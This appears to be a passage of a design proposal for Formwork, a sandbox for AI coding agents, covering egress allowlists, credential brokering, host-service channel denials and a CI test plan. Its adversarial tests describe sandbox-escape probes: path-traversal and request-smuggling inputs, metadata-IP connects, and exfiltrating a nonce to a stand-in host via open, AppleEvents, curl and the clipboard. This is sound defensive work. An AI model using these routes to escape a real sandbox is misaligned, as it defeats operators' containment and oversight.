| `FW-ISO13` **Channel baseline** | In every blueprint, the Confiner shall deny each channel in the shipped baseline set that is not lifted by `channels` or by a typed credential exclusion, using the mechanism listed for its platform. The baseline set is the §3.4 table minus any channel the transparency gates (§1.1) moved to `strict`; the FidelityReport shall list each moved channel as `Partial`. Where the platform mechanism is unavailable (Linux without supervised connect), the FidelityReport shall mark the channel `Partial`. |
| `FW-ISO14` **Privileged-interface baseline (macOS)** | The macOS profile shall deny `mach-priv-host-port`, `mach-priv-task-port`, and `iokit-open` outside the shipped IOKit allowlist. |
| `FW-ISO16` **Process-environment disclosure** | In every blueprint, the Confiner shall deny a confined process reading the environment of any process outside the session where the platform provides a mechanism (macOS `kern.procargs2` deny; Linux PID namespace under `isolate`). Where it does not (Linux without `isolate`), the FidelityReport shall mark it `Partial` and name the residual. |
| `FW-FID8` **Per-backend report lines** | The FidelityReport shall carry per-backend verdicts for: host scoping, inspection (with the client-trust caveat), UDP, pathname sockets, resolver closure, brokering, each `isolate` member, each channel, and privileged interfaces. |
| `FW-FID9` **Self-explaining refusals** | For each refusal this FEP introduces, Formwork shall emit, within the run, one line naming what was refused, the deciding rule, and the `explain` invocation that reproduces the verdict. The refusals are: Gateway 403s, supervised-connect denials, and TLS `unknown_ca` rejections of the session CA. The line goes in the HTTP 403 body, or on the operator channel. |
| `FW-DISC12` **Host and channel discovery** | `learn` shall reverse-compile Gateway egress violations and channel denials into proposal entries (`net.hosts`, `channels`) on both backends. It shall withhold, and itemize to the operator, metadata and private-IP destinations and credential-typed channels. |
| `FW-XR10` **Exit-code contract** | Wrapper subcommands shall exit with the workload's status. A Formwork failure after the workload is spawned shall exit `125` and emit a result-channel line attributing the failure to Formwork. |

Invariants:

- `FW-INV13` **Broker non-disclosure.** A brokered credential's bytes do not appear in:
  - a confined process's environment;
  - a file or service the process can read;
  - any Gateway response to it.
- `FW-INV14` **No out-of-sandbox execution.** A confined process cannot, through any channel in §3.4
  that its blueprint has not lifted, cause a process outside its session to:
  - execute a command;
  - open a URL;
  - perform network egress.

### 4.1 Test design: CI-first, paired, and never passing vacuously

CI runs both OSes, so every test below is written to run on a hosted runner. Following the
constitution's Testing section and `docs/unstated-requirements.md` items 4 and 10, each test obeys
these rules:

- **Control run first.** Each negative test first runs its probe *unconfined* and asserts that the
  channel is live on this runner — the marker file is written, the clipboard round-trips, the fixture
  receives the request. Only then does it run the probe confined and assert the denial.
  - This is the paired allow/deny rule applied to host services. Without the control, a test on a
    runner that has no pasteboard server would pass while proving nothing.
- **Not exercised is a failure in CI.** When the control run fails, the test skips locally with the
  reason. In CI, `FW_REQUIRE_EXERCISED=1` turns that skip into a failure: a platform test that never
  ran on its platform is a claim, not a verification.
- **Positive assertion of the denial.** Tests assert the denial record — the supervisor's violation,
  the unified-log `deny` line (the [FW-E2E-064](../formwork.md#fw-e2e-064) feed), the 403 body — not
  only the absence of a side effect. Absence is checked too, after the process tree has exited, not
  by waiting.
- **Least convenient shape.** Every probe is the fastest-failing workload: a process that dies on its
  first denial within milliseconds. This covers macOS channel denials, whose feed has the
  unified-log latency window.
- **Hermetic escape markers.** No test depends on Safari, Finder, or a TCC grant. Each "run
  outside" or "open" channel is exercised against a **fixture app** built by the test: a minimal
  `.app` bundle whose executable writes a marker file into a directory the confined process cannot
  write. If the marker exists, code ran outside the sandbox. `open -g -n fixture.app` exercises
  LaunchServices, `launchctl submit` exercises launchd, and an AppleEvent to the fixture app
  exercises `appleevent-send`.
  - Where a TCC consent would be needed for the *control* run on a hosted runner, the test asserts
    only the confined-side sandbox deny record. It declares itself `deny-record-only` in the
    traceability table, so the evidence level is visible.
- **Fixture services, not mocks.**
  - The Linux channel tests start a session `dbus-daemon`, plus a fixture socket service that runs
    commands it receives: a stand-in for `systemd --user` with the same socket shape.
  - The egress tests use FEP-1's loopback fixtures and resolver fixture.
  - These are real subprocess servers, as the MCP fixtures are.
- **Traceability.** Every test carries its `fw_e2e` / `fw_adv` marker and `macos` / `linux` marker,
  so the generated table shows which platform executed which requirement.

**CI changes** (the constitution's first-party-actions rule holds; nothing third-party is added):

| Change | Why |
|---|---|
| Add `macos-15` to the test matrix alongside `macos-14` | Seatbelt service names and `sysctl` behavior change across releases. Characterization runs on the current and previous major. |
| Add `ubuntu-24.04` alongside `ubuntu-22.04` | 24.04 restricts unprivileged user namespaces through AppArmor, so the `isolate` refusal path (XR9) is exercised on a runner, not assumed |
| Install `dbus` on Linux runners | Session-bus fixture for `FW-E2E-082` |
| Set `FW_REQUIRE_EXERCISED=1` in CI | Not-exercised fails instead of skipping |
| Run the README quickstart and each `examples/` agent blueprint on both OSes | D1, and `FW-E2E-084` |

### 4.2 Tests (draft)

The macOS characterization suite (§8) runs first. Its results decide the **(characterize)** marks;
the requirement tests below depend on it.

- `FW-E2E-075` **Sole egress path (both).** Under `net = { hosts = ["allowed.test"] }`:
  - a request through `HTTP_PROXY` reaches the fixture;
  - each of the following is denied, with a violation record:
    - a direct `connect()` to the fixture;
    - a direct `connect()` to `169.254.169.254`;
    - an unregistered or uncredentialed connection to the listener;
    - a UDP send;
    - `getaddrinfo("blocked.test")`.
- `FW-E2E-076` **Pathname socket (both).** Three sockets, each with an unconfined control:
  - one bound by an out-of-session fixture is refused;
  - one granted by `allow` connects;
  - one bound in-session connects.
- `FW-E2E-077` **Inspected path scope (both).** Under `POST allowed.test/repos/acme/**`:
  - `POST /repos/acme/x` passes;
  - `POST /repos/other/x` is refused with a 403 whose body names the rule (`FW-FID9`);
  - `GET /repos/acme/x` is refused.
- `FW-E2E-078` **Brokered header (both).**
  - The fixture receives the real `x-api-key`.
  - Confined `env` shows the placeholder.
  - Reading the catalog file is denied.
  - The placeholder sent to `other.test` is refused.
  - `FW-INV13` is checked by grepping every confined-readable surface the test can enumerate for the
    credential bytes.
- `FW-E2E-079` **Isolation tier (Linux, both runners).**
  - On `ubuntu-22.04`, with `isolate = ["processes", "tmp"]`:
    - `/proc` lists only session PIDs;
    - `/tmp` starts empty and unshared;
    - `kill` of a host PID fails.
  - On `ubuntu-24.04`, the run is refused before spawn, and the message names AppArmor and the
    alternative (XR9).
- `FW-E2E-080` **Isolation tier (macOS).** With the same request:
  - `kill` and `proc_pidinfo` on an unconfined control sibling fail;
  - `TMPDIR` and `confstr` resolve into the session;
  - a write to the shared per-user temp directory fails.

  The report's `processes` verdict matches what `ps` still shows.
- `FW-E2E-081` **Channels (macOS).** Under the default profile, each of the following is denied with
  a sandbox deny record, and no marker appears:
  - `open -g -n fixture.app`;
  - `launchctl submit` of a marker job;
  - an AppleEvent to the fixture app;
  - `pbcopy` / `pbpaste` of a nonce;
  - `security find-generic-password` against a test item created with `-A`, in a test keychain.

  Then:
  - with `channels = ["clipboard"]`, only the clipboard probe succeeds;
  - with `allow-credentials = ["os-keyring"]`, only the keychain probe succeeds.
- `FW-E2E-082` **Channels (Linux).** Against a session `dbus-daemon` and the fixture service, under
  supervised connect, each of these is denied with a violation record:
  - `gdbus call --session`;
  - the fixture's "run this" request;
  - a connection to a fixture X11-shaped socket.

  With the matching lifts, each succeeds.
- `FW-E2E-083` **Environment disclosure (both).** An unconfined sibling carries `FW_CANARY=<nonce>`
  in its environment.
  - Control: `ps -E` (macOS) or `/proc/<pid>/environ` (Linux) shows the nonce.
  - macOS, confined under the **default** profile: not shown.
  - Linux, confined under the default profile: shown, and the report says `Partial` with the residual
    (the [FW-E2E-025](../formwork.md#fw-e2e-025) honesty pattern); under `isolate = ["processes"]`
    on `ubuntu-22.04`: not shown, and the report says `Enforced`.
- `FW-E2E-084` **Agent examples under the baseline (both).** Each shipped `examples/` blueprint runs
  its agent's non-interactive smoke command with the baseline on, with zero denials outside the
  lift set the example documents. The
  Claude Code example's login layer is exercised separately with `channels = ["open-url"]`.
- `FW-E2E-085` **Discovery of hosts and channels (both).** `learn` runs a millisecond workload that
  does two things and exits: hits `blocked.test` through the proxy, and touches the clipboard.
  - It proposes `net.hosts = ["blocked.test"]` and `channels = ["clipboard"]`.
  - A workload that hits `169.254.169.254` produces a withheld line, not a proposal.
- `FW-E2E-086` **Exit-code contract (both).**
  - A workload exiting 3 makes `run` exit 3.
  - Killing the Gateway mid-run makes `run` exit 125, with the attribution line on stdout.
- `FW-ADV-016` **Gateway frame bypass (D6).** A batch array, a non-JSON frame, and an id-less
  `tools/call` for a shaded tool each fail to reach the backend.
- `FW-ADV-017` **Path traversal against an inspected rule.** Each of the following is refused or
  canonicalizes out of scope:
  - `/repos/acme/../other/x`;
  - `/repos/acme/%2e%2e/other/x`;
  - `/repos/acme%2F..%2Fother/x`;
  - a CL+TE smuggle.
- `FW-ADV-018` **Supervisor race (Linux).** A second thread rewrites the `sockaddr` while `connect()`
  is pending. The connection lands only where the supervisor's copy was allowed.
- `FW-ADV-019` **Endpoint theft (macOS).** An unconfined same-uid process holding `P` and the
  credential connects to the listener. Pass, either way:
  - the peer check refuses it; or
  - if characterization found the peer check unreliable, the report is `Partial` and names this
    residual.
- `FW-ADV-020` **Exfiltration through a host service (both).** Under
  `net = { hosts = ["allowed.test"] }`, the agent tries to send a nonce to the `blocked.test`
  fixture through each channel:
  - `open` of the fixture app with a URL argument;
  - an AppleEvent;
  - the Linux fixture service running `curl`;
  - a clipboard hand-off to an unconfined reader.

  The nonce never reaches the fixture. Checked after the process tree exits.

---

## 5. Parity after this FEP

Conditional on the characterization suite confirming the **(characterize)** marks.

| Capability | Omnigent Linux | Omnigent macOS | Formwork Linux after | Formwork macOS after |
|---|---|---|---|---|
| Mandatory egress host allowlist | Enforced (netns) | Enforced (SBPL) | Enforced (supervisor) | Enforced (SBPL + authenticated listener) or `Partial` per characterization |
| Method/path rules | Enforced, not canonicalized | Same | Enforced, canonicalized | Enforced for env-trust clients; platform-verifier clients refused |
| Credential injection | `Authorization` only; CA key on disk | Same | Any header scheme; ephemeral CA; floor holds | Same, with the client-trust caveat |
| Private IP / metadata block | Enforced | Enforced | Enforced under `AllowHosts` ([FW-EGR4](fep-1.md#fw-egr4)) | Same |
| UDP / local resolver | Closed | Closed | Closed under `AllowHosts`; reported under `Ports` | Same |
| Pathname AF_UNIX | Unreachable (not mounted) | Denied | Mediated | Enforced (literals) |
| Host-service channels | Closed | Partly (mach open) | Closed under supervised connect, else `Partial` | Closed; keychain lift is whole-channel |
| Privileged interfaces | seccomp | Not granted | seccomp | Denied, IOKit allowlist |
| Other processes' env | Hidden | Open **(characterize)** | `Partial` by default (same-uid readable, reported); `Enforced` under `isolate` | Blocked, default-on |
| Process visibility / IPC / tmp | Namespaces | Self-only signal/info | Opt-in, namespaces | Opt-in, filters |
| Runs without user namespaces | No | n/a | Yes, except `isolate` `processes`/`ipc` | n/a |
| Explain / learn for egress and channels | No | No | Yes | Yes |
| Windows | Job Object only | — | Not provided (non-goal) | — |

---

## 6. Surface changes (each measured against Growth)

- **Blueprint fields.** Three are new; one is extended.
  - **`net` (extended).** `net = { hosts = [...] }` is FEP-1's `AllowHosts`. An entry is either a
    host string or a table `{ host, methods, paths }` (a TOML 1.0 mixed array). A bare string stays
    a host-only rule.
  - **`broker-credentials`** — a list of Catalog types. It is the typed complement of
    `allow-credentials`, and a type listed in both is a parse error.
  - **`channels`** — a closed enum (`run-outside`, `open-url`, `clipboard`, `screen`, `camera`,
    `microphone`). A typo fails at parse and lists the valid names (`deny_unknown_fields`
    discipline).
    - Rejected alternative: `allow:service:<mach-name>` in `rules`. It put platform names in
      blueprints and broke [FW-XR6](../formwork.md#fw-xr6).
  - **`isolate`** — a subset of `["processes", "ipc", "tmp"]`.
    - Rejected alternative: making it automatic. Process isolation is visible to tools, and
      transparency is the default.
- **Catalog.** Additions, which bump the embedded catalog version:
  - an optional `broker` block;
  - a `services` location kind;
  - the `os-keyring` type;
  - the `claude` type's macOS keychain location.
- **CLI.**
  - No new subcommand.
  - `explain` accepts URLs and channel names positionally (§3.5).
  - One new flag, `--blueprint -`. An earlier draft's `run --gateway <socket>` for `confine-self` is
    withdrawn: the refusal plus the spawn-posture alternative (`FW-EGR14`) covers the need without
    adding surface.
- **Default profile.** It gains the channel baseline, the privileged-interface baseline, and the
  environment-disclosure deny, all gated by `FW-E2E-084` and the toolchain tests
  ([FW-E2E-020](../formwork.md#fw-e2e-020)..023) on both OSes.
- **Examples.**
  - The `claude-code`, `codex` and `opencode` blueprints move from `ports = [443]` to
    `net = { hosts = [...] }` with brokering.
  - Each gains a short "what the baseline blocks and how to lift it" note.
  - The README quickstart stays at most five lines, and FW IDs stay out of the README (document
    audience rule).
- **Dependencies (the hardest no).**
  - `rustls`, `rcgen` and `hyper`, confined to `formwork-gateway`. They are needed only for
    inspection. `rustls` is chosen over OpenSSL for a memory-safe trust base.
  - The Linux supervisor uses raw `seccomp(2)` and needs no new crate. The macOS peer check uses
    `libproc` through `libc`.
- **Deprecations.** None. The FEP adds surface and renames nothing.

---

## 7. Proposed amendments to the landed docs (apply on landing)

- **`docs/fep-1.md` Non-goals.** Replace the TLS-interception and credential-masking bullets with a
  pointer to FEP-5 §3.2. Fix the `AllowHosts` TOML spelling as `net = { hosts = [...] }`.
- **`formwork.md` §3 threat model.** Add to the in-scope list: "a confined process causing a process
  outside its session to act on its behalf — execute, open a URL, perform egress, or disclose a
  secret — through a host service" (`FW-INV14`).
- **`formwork.md` §9.**
  - Correct the Linux cross-domain bullet: Landlock scoping covers abstract sockets and signals;
    `/proc/<pid>/environ` of same-uid processes stays readable without a PID namespace.
  - Add the macOS SBPL operations and the Linux supervisor.
  - Add a fidelity row per `FW-FID8` line.
  - Copy §3.6.
  - Correct the Linux UDP/AF_UNIX rows and the macOS resolver row.
- **`formwork.md` §5.3.** Reword [FW-ISO8](../formwork.md#fw-iso8) to cover both backends.
- **`formwork.md` §11.**
  - Close "fd-minting default" (on-demand via the supervisor on Linux; a static endpoint on macOS).
  - Close "Credential brokering".
  - Narrow "Linux gateway egress isolation build-vs-buy" to the optional netns path.
- **`docs/unstated-requirements.md`.** Mark item 12 minted as `FW-XR10`, and item 10 as applied by
  §4.1's CI changes.
- **`constitution.md` Vocabulary.**
  - **broker**: the Gateway presenting a credential it holds, never disclosing its bytes.
  - **placeholder**: the per-session stand-in for a brokered env var.
  - **inspect**: TLS termination at the Gateway for a host rule that needs request-level policy.
  - **supervise**: the Gateway receiving a confined `connect()` through seccomp user notification
    and minting the connection itself.
  - **channel**: a host service that can act outside the sandbox on a confined process's behalf,
    named by a portable enum value.
  - **characterize**: a CI test that records how a platform mechanism behaves, run before a
    requirement relying on it is anchored.

---

## 8. Open questions and the characterization suite

### 8.1 macOS characterization suite (settles every **(characterize)** mark)

These run in CI on `macos-14` and `macos-15`, with `FW_REQUIRE_EXERCISED=1`. Each test records the
observed behavior as a fixture that later requirement tests assert against. A change across macOS
releases therefore fails CI visibly, instead of silently widening the sandbox.

| # | Question | Test shape |
|---|---|---|
| C1 | Do SBPL remote filters accept only `*` / `localhost` hosts? | Compile profiles with a literal-IP remote filter and assert on the `sandbox_init` result |
| C2 | Is the `PROC_PIDFDSOCKETINFO` peer lookup reliable, including under churn and for reparented descendants? | 1,000 connections from a confined process tree, with 10 % reparented. Assert that every one is attributed |
| C3 | Which `mach-lookup` names do `open`, `launchctl submit`, AppleEvents, `pbcopy`/`pbpaste`, `security` and `screencapture` use? | Run each probe under a `(deny mach-lookup)` profile and harvest the deny records. The harvested set becomes the checked-in channel map |
| C4 | Are `lsopen` and `appleevent-send` checked for a `sandbox_init` process? Does `(deny default)` close them (Omnigent parity)? | Fixture app, with a control run |
| C5 | Does `kern.procargs2` return same-uid environments, and does a `sysctl-name` deny close it? Which MIBs does `ps` use? | Canary sibling, control run, then confined |
| C6 | Which `(target …)` forms keep in-session process management working? | Shell job control, `node` `child_process`, `make -j`, `python -m multiprocessing` under the filters |
| C7 | Can POSIX IPC be confined to a session prefix? | `multiprocessing` shared memory, Node workers |
| C8 | IOKit allowlist and transparency | The toolchain suite plus `swift build`, Homebrew, `gh` and Xcode CLT under the privileged-interface baseline; harvest the `iokit-open` denies |
| C9 | What is Claude Code's keychain item and login flow? | Run the example's smoke command; record the keychain and `lsopen` denies |

### 8.2 Other open questions

- **D3 layout.** Three options:
  - `.formwork/` in the project (recommended: committable, and it keeps the team workflow);
  - a per-user state directory (the root is not split, but learned grants become machine-local);
  - Landlock `Make*` rights on the split root, rejected because they propagate into hole
    directories.
- **HTTP/2 on inspected hosts.** Offer HTTP/1.1 only through ALPN, or add an h2 codec? A spike
  against the model-API clients decides.
- **Per-process trust on macOS.** Security.framework clients ignore env-var trust. None of the
  candidates is scoped to one process:
  - a keychain search list is per user;
  - `SecTrustSettings` has no per-process scope.

  Revisit if a brokered type's primary client can't be replaced.
- **Narrower keychain lifts on macOS.** Brokering the Claude credential would need the Gateway to
  read the item and substitute it, the same as `FW-CRED11`. It only works if the client reads its
  token from an env var or a file as well as the keychain. Characterization (C9) decides.
- **Request-signing credentials** (SigV4, GCP): these need a signer in the Gateway. Deferred.
- **Placeholders in request bodies:** out of scope unless a Catalog type needs them.
- **Transparent mode.** The supervisor could redirect any allowed `connect()` on Linux, but that
  needs a DNS answer path. On macOS it would need a Network Extension.
- **Network Extension on macOS.** Per-process attribution and synchronous violations. It needs a
  signed system extension and an entitlement, and it is not proposed while releases are unsigned.
- **Namespace-tier init (Linux).** A forked Formwork process, or the launcher re-parented. Pre-exec
  code does not allocate, which constrains the choice.
- **`(deny default)` base on macOS.** A candidate for `strict` once C3 and C8 yield a complete
  allowlist for common toolchains.
- **`sandbox_init` deprecation.** The replacements would be Endpoint Security (which needs an
  entitlement) or App Sandbox containers (which don't fit arbitrary CLI trees). The
  Compiler/Confiner split keeps the change within one crate.
- **Landlock pathname-socket scoping.** If a future ABI mediates pathname `connect()`, `FW-ISO12`
  moves to Landlock.

---

## 9. Usability review of this proposal

This section applies the seven criteria of `docs/usability-review.md` and the norms of
`docs/unstated-requirements.md` (several now minted) to the draft this FEP replaced. Each finding
changed the text above.

| Criterion / norm | Finding in the earlier draft | Resolution |
|---|---|---|
| **Parity** ([FW-XR6](../formwork.md#fw-xr6)) | Channel lifts were spelled `allow:service:<mach-name>`, so the same blueprint meant nothing on Linux. `isolate`'s `procargs` member named a macOS sysctl | Portable `channels` enum and `os-keyring` type (§3.4); `isolate` members renamed `processes` / `ipc` / `tmp`; environment protection default-on on macOS and honestly `Partial` on Linux without the tier (`FW-ISO16`) |
| **Honest promises** / surface fail-fast ([FW-XR9](../formwork.md#fw-xr9)) | "Fail loudly at the requested verdict" was undefined: a blueprint cannot request a verdict. `AllowHosts` under `confine-self` had no stated failure point. A `gh` user on macOS learned about the CA problem from a TLS error mid-session | Unenforceable is refused before spawn, and `Partial` runs with one named residual line (§1.1, `FW-ISO10`, `FW-EGR14`). Client-trust caveats are surfaced before the run by `explain` and the operator channel (§3.2) |
| **CLI simplicity** / Growth | `run --gateway <socket>` added surface for a posture embedders don't use | Withdrawn. `run` hosts the Gateway, and `confine-self` + `AllowHosts` is refused with the alternative named (`FW-EGR14`). New inputs to `explain` are positional arguments typed by shape, not new subcommands |
| **Docs** / audience layering | The earlier draft said nothing about what users see | §6 keeps the README quickstart to at most five lines with no FW IDs, and puts channel and brokering recipes in `examples/` |
| **Examples** | The baseline would have silently broken the flagship Claude Code example on macOS (keychain credential, browser login) | `claude` Catalog type gains its keychain location; the example documents a login-only `open-url` layer; `FW-E2E-084` runs every example on both OSes |
| **Explainability** ([FW-FID6](../formwork.md#fw-fid6)) | New denial kinds (host, request, channel, socket) had no `explain` path and no runtime message | `explain` accepts URLs, channels and sockets; `FW-FID9` puts a rule and an `explain` hint on every new refusal, including the TLS `unknown_ca` diagnosis |
| **Good defaults** | The operator had to know an agent's hosts and channels in advance to write `net.hosts` / `channels` | `learn` proposes both (`FW-DISC12`), with the floor rule extended to metadata IPs and keyring channels |
| Resolved-input disclosure ([FW-FID7](../formwork.md#fw-fid7)) | Listener endpoint, CA path, session tmp, and the D3 layout were auto-chosen and undisclosed | All are named in `compile` / `explain` output (§3.5); placeholders are named by type, never by value |
| Discovery trust scope ([FW-BP8](../formwork.md#fw-bp8)) | D3's first fix moved learned grants to a machine-local state directory, which changed the team workflow | Recommended `.formwork/` in the project, inside the unchanged BP8 walk (§2, §8.2) |
| Loop drivability ([FW-DISC11](../formwork.md#fw-disc11)) | New denial kinds had no path into the observe/list/accept loop | `FW-DISC12` feeds them into the existing loop; no new artifact files |
| Results vs telemetry | Violation and diagnosis lines had no channel assigned | Refusal explanations go on the operator channel (stderr). The exit-code attribution line is a result (stdout), since a script needs it under `RUST_LOG=warn` |
| Exit codes (item 12) | Two new failure modes after spawn (Gateway, supervisor) made "agent failed" and "sandbox failed" indistinguishable to an embedder | Minted as `FW-XR10`: exit `125` plus an attribution line |
| Least-convenient test shape (item 4) | Tests used comfortable workloads, and channel tests depended on Safari, Finder and TCC grants | Millisecond probes, a fixture app as the marker, `deny-record-only` evidence declared (§4.1) |
| Verification states where it ran (item 10) | Claims marked "spike" had no execution plan; a skipped test could look like a pass | Characterization suite in CI on two macOS majors; `FW_REQUIRE_EXERCISED=1`; `ubuntu-24.04` added to exercise the user-namespace refusal path |
